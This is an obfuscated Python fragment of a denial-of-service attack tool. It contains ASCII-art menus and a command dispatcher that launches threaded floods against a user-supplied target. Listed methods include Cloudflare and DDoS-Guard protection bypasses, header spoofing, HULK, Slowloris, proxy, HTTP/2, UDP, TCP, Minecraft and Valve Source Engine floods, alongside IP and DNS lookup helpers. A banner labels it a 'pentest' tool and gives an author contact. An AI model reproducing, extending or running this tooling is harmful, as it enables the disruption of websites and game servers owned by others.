(_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║                 \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTWHITE_EX +'╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝                   \n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +'        ════╦════════════════════════════════════╦══\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +'╔═══════════╩════════════════════════════════════╩═════════╗\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +IlIIIIlIIlIlIlIIl +Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' STRONG Bypass with spoof Xforward         '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'cfb   '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Bypass CF Attack                          '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'pxcfb '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Bypass CF Attack With Proxy               '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'cfpro '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Bypass CF UAM, CAPTCHA, BFM (request)     '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'cfsoc '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Bypass CF UAM, CAPTCHA, BFM (socket)      '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'bypass'+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Bypass Google Project Shield, Vshield,    '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'sky   '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' DDoS Guard Free, CF NoSec                 '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'stellar'+Fore .LIGHTGREEN_EX +'  |'+Fore .LIGHTWHITE_EX +' HTTPS Sky method without proxies          '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'stress  '+Fore .LIGHTGREEN_EX +' |'+Fore .LIGHTWHITE_EX +' DDos stress HEX method                    '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'get   '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Get Request Attack                        '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'post  '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Post Request Attack                       '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'head  '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Head Request Attack                       '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'http2 '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' HTTP 2.0 Request Attack                   '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +IlIIIIlIIlIlIlIIl +Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' HTTP Spoof Socket Attack                  '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'soc   '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Socket Attack                             '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'hulk  '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Hulk DoS tool                             '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'pxhulk'+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Proxy Hulk DoS tool                       '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'pxraw '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Proxy Request Attack                      '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'pxsoc '+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Proxy Socket Attack                       '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IIIIIlllIllIlllIl +Fore .LIGHTWHITE_EX +'pxslow'+Fore .LIGHTGREEN_EX +IllllIllllIIIllIl +Fore .LIGHTWHITE_EX +' Proxy Slowloris attack                    '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +'╚══════════════════════════════════════════════════════════╝\n');stdout .write (_IIllIIIlIIlIIlIII )
def IIlIlIlIIlllllIll ():IllIIIIlIlIlIlllI =' UDP Attack                                ';IlIIlllIIlIIIllII ();stdout .write (_IlIllIIIIIIIIlIIl );stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTWHITE_EX +'██╗      █████╗ ██╗   ██╗███████╗██████╗ ██╗  ██╗             \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║  ██║             \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██║     ███████║ ╚████╔╝ █████╗  ██████╔╝███████║              \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║              \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'███████╗██║  ██║   ██║   ███████╗██║  ██║     ██║                \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTWHITE_EX +'╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═╝                 \n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIllIlllIIIIII );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IIIllIIIlIlIlIIll );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +'udp   '+Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +IllIIIIlIlIlIlllI +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +'tcp   '+Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +IllIIIIlIlIlIlllI +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +'mine  '+Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' Minecraft Dos attack                      '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +'vse   '+Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' Send Valve Source Engine Protocol         '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IlIlIIllIIIlIllII );stdout .write (_IIllIIIlIIlIIlIII )
def IlIIlIllIlIIllllI ():IlIIlIllIIIIIIlll ='                     ║\n';IIIlIllIlIIIlIlII ='   ██║   ██║   ██║██║   ██║██║             \n';IllIIlIIIlIllIIIl ='                    ';IlIIlllIIlIIIllII ();stdout .write (_IlIllIIIIIIIIlIIl );stdout .write (IllIIlIIIlIllIIIl +Fore .LIGHTWHITE_EX +'████████╗ ██████╗  ██████╗ ██╗             \n');stdout .write (IllIIlIIIlIllIIIl +Fore .LIGHTGREEN_EX +'╚══██╔══╝██╔═══██╗██╔═══██╗██║             \n');stdout .write (IllIIlIIIlIllIIIl +Fore .LIGHTGREEN_EX +IIIlIllIlIIIlIlII );stdout .write (IllIIlIIIlIllIIIl +Fore .LIGHTGREEN_EX +IIIlIllIlIIIlIlII );stdout .write (IllIIlIIIlIllIIIl +Fore .LIGHTGREEN_EX +'   ██║   ╚██████╔╝╚██████╔╝███████╗             \n');stdout .write (IllIIlIIIlIllIIIl +Fore .LIGHTWHITE_EX +'   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝             \n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIllIlllIIIIII );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IIIllIIIlIlIlIIll );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +'geoip '+Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' Geo IP Address Lookup'+Fore .LIGHTGREEN_EX +IlIIlIllIIIIIIlll );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +'dns   '+Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' Classic DNS Lookup   '+Fore .LIGHTGREEN_EX +IlIIlIllIIIIIIlll );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +'subnet'+Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' Subnet IP Address Lookup   '+Fore .LIGHTGREEN_EX +'               ║\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IlIlIIllIIIlIllII );stdout .write (_IIllIIIlIIlIIlIII )
def IIlIlIlIlIlllIIIl ():IllllllIlIIIlIlll ='║ ';IIIIlIIIllIIIIIIl ='   ';stdout .write ('                                                                                          \n');stdout .write (IIIIlIIIllIIIIIIl +Fore .LIGHTGREEN_EX +'                        ██████╗ ███╗   ███╗ ██████╗\n');stdout .write (IIIIlIIIllIIIIIIl +Fore .LIGHTWHITE_EX +'                        ██╔══██╗████╗ ████║██╔════╝\n');stdout .write (IIIIlIIIllIIIIIIl +Fore .LIGHTGREEN_EX +'                        ██║  ██║██╔████╔██║██║ \n');stdout .write (IIIIlIIIllIIIIIIl +Fore .LIGHTWHITE_EX +'                        ██║  ██║██║╚██╔╝██║██║ \n');stdout .write (IIIIlIIIllIIIIIIl +Fore .LIGHTGREEN_EX +'                        ██████╔╝██║ ╚═╝ ██║╚██████╗\n');stdout .write (IIIIlIIIllIIIIIIl +Fore .LIGHTWHITE_EX +'                        ╚═════╝ ╚═╝ ╚═╝ ╚═════╝\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIllIlllIIIIII );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IIIllIIIlIlIlIIll );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IllllllIlIIIlIlll +Fore .LIGHTGREEN_EX +'           𝙋𝙀𝙉𝙏𝙀𝙎𝙏 𝘿𝙊𝙎 𝙈𝙐𝙏𝙄𝙇 𝙈𝙀𝙏𝙃𝙊𝘿           '+Fore .LIGHTGREEN_EX +'      ║\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IllllllIlIIIlIlll +Fore .LIGHTWHITE_EX +'           𝘼𝘿𝘿𝙀𝘿 𝙉𝙀𝙒 𝙈𝙀𝙏𝙃𝙊𝘿 𝘼𝙉𝘿 𝘽𝙔𝙋𝘼𝙎𝙎    '+Fore .LIGHTGREEN_EX +'          ║\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IllllllIlIIIlIlll +Fore .LIGHTGREEN_EX +'           𝙈𝙎𝙂 𝘼𝙐𝙏𝙃𝙊𝙍 +𝟮𝟯𝟰𝟴𝟭𝟭𝟵𝟱𝟵𝟮𝟭𝟳𝟬  '+Fore .LIGHTGREEN_EX +'              ║\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +IllllllIlIIIlIlll +Fore .LIGHTWHITE_EX +'          𝙏𝙔𝙋𝙀 [help] 𝙏𝙊 𝙎𝙀𝙀 𝙏𝙃𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎    '+Fore .LIGHTGREEN_EX +'       ║\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IlIlIIllIIIlIllII );stdout .write (_IIllIIIlIIlIIlIII )
def IIllIIIIlIllIIlIl ():
	IlIlIIIlllIIllIII ='IP ';IlIlIIllIIIIIIlll ='Failed to bypass cf\n';IIlIllIIIIIIlIIIl ='Bypassing CF... (Max 60s)\n';IIllllllIIIlIIIIl ='An error has occurred while sending the request to the API!';IllIIlIIIlIlIIIIl =' [>] ';IllllIIlllIIllllI =' [*] ';stdout .write (Fore .LIGHTGREEN_EX +'╔═══'+Fore .LIGHTGREEN_EX +'[root'+Fore .LIGHTGREEN_EX +'@'+Fore .LIGHTGREEN_EX +'DEVIL_MAY_CRY'+Fore .CYAN +']'+Fore .LIGHTGREEN_EX +'\n╚══\x1b[38;2;0;255;189m> '+Fore .WHITE );IIIlIlllIIlIIIlIl =input ()
	if IIIlIlllIIlIIIlIl =='cls'or IIIlIlllIIlIIIlIl =='clear':IlIIlllIIlIIIllII ();IIlIlIlIlIlllIIIl ()
	elif IIIlIlllIIlIIIlIl =='help'or IIIlIlllIIlIIIlIl =='?':help ()
	elif IIIlIlllIIlIIIlIl =='credit':IlllllllIIlllIlIl ()
	elif IIIlIlllIIlIIIlIl =='layer7'or IIIlIlllIIlIIIlIl =='LAYER7'or IIIlIlllIIlIIIlIl =='l7'or IIIlIlllIIlIIIlIl =='L7'or IIIlIlllIIlIIIlIl =='Layer7':IIllllIlIlIllIIII ()
	elif IIIlIlllIIlIIIlIl =='layer4'or IIIlIlllIIlIIIlIl =='LAYER4'or IIIlIlllIIlIIIlIl =='l4'or IIIlIlllIIlIIIlIl =='L4'or IIIlIlllIIlIIIlIl =='Layer4':IIlIlIlIIlllllIll ()
	elif IIIlIlllIIlIIIlIl =='tools'or IIIlIlllIIlIIIlIl =='tool':IlIIlIllIlIIllllI ()
	elif IIIlIlllIIlIIIlIl =='exit':exit ()
	elif IIIlIlllIIlIIIlIl =='test':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IlIIllIIIIlIIlIIl (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI ,_IlllIIlIlIIIIIlII );time .sleep (10 )
	elif IIIlIlllIIlIIIlIl =='cfb'or IIIlIlllIIlIIIlIl =='CFB':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIllIIIlllllllII (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='pxcfb'or IIIlIlllIIlIIIlIl =='PXCFB':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();threading .Thread (target =IlIIllIlIIlIlIlll ,args =(IIIIllIlIIIlIIllI ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='get'or IIIlIlllIIlIIIlIl =='GET':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IlIIIIlIIIIIlIllI (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='post'or IIIlIlllIIlIIIlIl =='POST':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIlIIllIIlIlIllII (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='head'or IIIlIlllIIlIIIlIl ==_IlllIIlIlIIIIIlII :IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IlIlllIlIIIllIIll (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='pxraw'or IIIlIlllIIlIIIlIl =='PXRAW':
		if IllIIIIllIIIlIIll ():IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IlIIlIIIIIIllIIlI (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='soc'or IIIlIlllIIlIIIlIl =='SOC':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IllIIIIlIIllllIlI (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='hulk'or IIIlIlllIIlIIIlIl =='HULK':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IlIIlIlIIllIlIIll (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='pxhulk'or IIIlIlllIIlIIIlIl =='PXHULK':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIlllIllIIlIIIlI (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='pxsoc'or IIIlIlllIIlIIIlIl =='PXSOC':
		if IllIIIIllIIIlIIll ():IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIlIIIlIIIlIllIll (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='cfpro'or IIIlIlllIIlIIIlIl =='CFPRO':
		IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();stdout .write (Fore .MAGENTA +IllllIIlllIIllllI +Fore .WHITE +IIlIllIIIIIIlIIIl )
		if IlIlIIIlllIllIlll (IIIIllIlIIIlIIllI ):IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IlIIIllIIIIIIlllI (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
		else :stdout .write (Fore .MAGENTA +IllllIIlllIIllllI +Fore .WHITE +IlIlIIllIIIIIIlll )
	elif IIIlIlllIIlIIIlIl =='cfsoc'or IIIlIlllIIlIIIlIl =='CFSOC':
		IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();stdout .write (Fore .MAGENTA +IllllIIlllIIllllI +Fore .WHITE +IIlIllIIIIIIlIIIl )
		if IlIlIIIlllIllIlll (IIIIllIlIIIlIIllI ):IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIlIlIIIIlIlIIIll (IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI );IIIIllIllIllIlIIl .join ()
		else :stdout .write (Fore .MAGENTA +IllllIIlllIIllllI +Fore .WHITE +IlIlIIllIIIIIIlll )
	elif IIIlIlllIIlIIIlIl =='sky':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();threading .Thread (target =IlIIIIllIIIIlIlIl ,args =(IIIIllIlIIIlIIllI ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='spoof':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();threading .Thread (target =IllIlllIIIIlIllIl ,args =(IIIIllIlIIIlIIllI ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='bypass':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();threading .Thread (target =IIIlIlllllllIIllI ,args =(IIIIllIlIIIlIIllI ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='pxslow':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();threading .Thread (target =IIlIIlIllIlIIIIlI ,args =(IIIIllIlIIIlIIllI ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='http2':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();threading .Thread (target =IlIlllIlIIIlllIll ,args =(IIIIllIlIIIlIIllI ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='stellar':IIIIllIlIIIlIIllI ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IIlllIIIIlIIIIllI ();threading .Thread (target =IIIlIlIIlIIIIIlIl ,args =(IIIIllIlIIIlIIllI ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='udp'or IIIlIlllIIlIIIlIl =='UDP':IIIIllIlIIIlIIllI ,IIIlIllIlllIllIII ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IlIIllllIlIllIlIl ();threading .Thread (target =IlllIIIlIlllllIlI ,args =(IIIIllIlIIIlIIllI ,IIIlIllIlllIllIII ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
